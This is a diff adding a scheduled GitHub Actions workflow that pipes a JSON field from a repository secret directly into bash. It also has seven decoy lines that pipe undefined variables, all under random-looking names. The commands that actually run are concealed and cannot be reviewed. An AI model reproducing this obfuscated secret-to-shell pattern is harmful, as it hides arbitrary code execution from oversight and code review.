@@ -1,0 +1,26 @@
+name: yanzhishuicha
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '5 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yanzhishuicha
+        env:
+          ts783: ${{ secrets.ts783 }}
+        run: |
+          echo $ts783 | jq -r .xfssb611 | /bin/bash
+          echo $efzo59 | jq -r .cw4 | /bin/bash
+          echo $xkepp514 | jq -r .zj04623 | /bin/bash
+          echo $hfj1 | jq -r .zvlr160 | /bin/bash
+          echo $d54836 | jq -r .m3829 | /bin/bash
+          echo $yxnl3 | jq -r .ql61 | /bin/bash
+          echo $gv8 | jq -r .tq86658 | /bin/bash
+          echo $kdii9 | jq -r .w16010 | /bin/bash
+
